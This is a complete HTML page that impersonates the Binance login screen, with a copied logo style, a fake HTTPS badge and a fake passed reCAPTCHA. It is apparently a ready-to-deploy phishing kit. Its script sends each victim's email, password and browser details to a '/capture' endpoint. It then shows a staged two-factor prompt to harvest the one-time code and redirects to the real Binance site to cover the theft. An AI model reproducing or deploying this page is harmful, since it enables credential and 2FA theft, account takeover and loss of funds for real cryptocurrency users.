<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; }
        body { background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: #fff; border-radius: 12px; box-shadow: 0 2px 20px rgba(0,0,0,0.1); padding: 40px; width: 400px; max-width: 90%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 140px; height: auto; }
        .logo h1 { color: #f0b90b; font-size: 28px; font-weight: 700; margin-top: 10px; }
        .logo p { color: #666; font-size: 14px; margin-top: 5px; }
        h2 { font-size: 20px; margin-bottom: 25px; color: #1e2329; }
        .form-group { margin-bottom: 20px; }
        label { display: block; font-size: 14px; font-weight: 500; color: #1e2329; margin-bottom: 6px; }
        input { width: 100%; padding: 12px 16px; border: 1px solid #dce1e6; border-radius: 8px; font-size: 14px; transition: border-color 0.2s; }
        input:focus { outline: none; border-color: #f0b90b; box-shadow: 0 0 0 3px rgba(240,185,11,0.1); }
        .btn { width: 100%; padding: 14px; background: #f0b90b; color: #202020; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        .btn:hover { background: #d6a50a; }
        .error { color: #e74c3c; font-size: 13px; margin-top: 8px; display: none; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
        .footer a { color: #f0b90b; text-decoration: none; }
        .loading { display: none; text-align: center; margin-top: 15px; color: #666; }
        .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #f0b90b; border-radius: 50%; border-top-color: transparent; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .security-badge { display: flex; align-items: center; gap: 8px; background: #f0f9f0; padding: 10px; border-radius: 8px; margin-top: 15px; font-size: 12px; color: #2d7d46; }
        .security-badge svg { flex-shrink: 0; }
        #captcha-section { margin-top: 20px; display: none; }
        .captcha-box { background: #f9f9f9; border: 1px solid #dce1e6; border-radius: 8px; padding: 15px; text-align: center; }
        .checkbox-row { display: flex; align-items: center; gap: 10px; justify-content: center; }
        .checkbox-row input { width: auto; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 200 60" fill="none">
                <rect x="10" y="10" width="40" height="40" rx="8" fill="#f0b90b"/>
                <text x="30" y="36" text-anchor="middle" fill="#202020" font-size="20" font-weight="bold">B</text>
                <text x="65" y="36" fill="#1e2329" font-size="24" font-weight="bold">Binance</text>
            </svg>
        </div>
        <h2>Log In</h2>
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="your@email.com" required autocomplete="email">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
            </div>
            <div id="captcha-section">
                <div class="captcha-box">
                    <div class="checkbox-row">
                        <input type="checkbox" id="captcha-check" checked disabled>
                        <label for="captcha-check" style="margin:0;font-size:13px;color:#555;">I'm not a robot</label>
                    </div>
                    <p style="font-size:11px;color:#999;margin-top:5px;">reCAPTCHA verification passed</p>
                </div>
            </div>
            <div class="error" id="errorMsg">Invalid email or password. Please try again.</div>
            <button type="submit" class="btn" id="submitBtn">Log In</button>
            <div class="loading" id="loading">
                <span class="spinner"></span> Verifying...
            </div>
            <div class="security-badge">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                    <path d="M8 1L3 3.5V7c0 3.5 2 6.5 5 7.5 3-1 5-4 5-7.5V3.5L8 1z" fill="#2d7d46"/>
                    <path d="M7 8.5L5.5 7 4.5 8l2.5 2.5 4-4-1-1-3 3z" fill="white"/>
                </svg>
                Secure connection (HTTPS)
            </div>
        </form>
        <div class="footer">
            <a href="#">Forgot password?</a> &middot; <a href="#">Register</a> &middot; <a href="#">Help</a>
        </div>
    </div>

    <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const submitBtn = document.getElementById('submitBtn');
        const loading = document.getElementById('loading');
        const captchaSection = document.getElementById('captcha-section');

        // Show loading
        submitBtn.style.display = 'none';
        loading.style.display = 'block';

        // Capture data and send to server
        const data = {
            email: email,
            password: password,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            page: window.location.href
        };

        fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(result => {
            loading.style.display = 'none';

            if (result.status === 'ok') {
                // Simulate 2FA request for realism
                document.querySelector('h2').textContent = 'Two-Factor Authentication';
                document.querySelector('.form-group:nth-child(2)').innerHTML = `
                    <label for="otp">Enter 2FA Code</label>
                    <input type="text" id="otp" placeholder="000000" maxlength="6" required>
                `;
                document.getElementById('email').disabled = true;
                document.getElementById('password').disabled = true;
                captchaSection.style.display = 'block';
                submitBtn.textContent = 'Verify';
                submitBtn.style.display = 'block';

                // Override submit for 2FA
                const form = document.getElementById('loginForm');
                form.onsubmit = function(e2) {
                    e2.preventDefault();
                    const otp = document.getElementById('otp').value;
                    fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ email: email, otp: otp, type: '2fa' })
                    }).then(() => {
                        window.location.href = 'https://www.binance.com/en/support';
                    });
                };
            }
        })
        .catch(error => {
            loading.style.display = 'none';
            submitBtn.style.display = 'block';
            document.getElementById('errorMsg').style.display = 'block';
        });
    });
    </script>
</body>
</html>
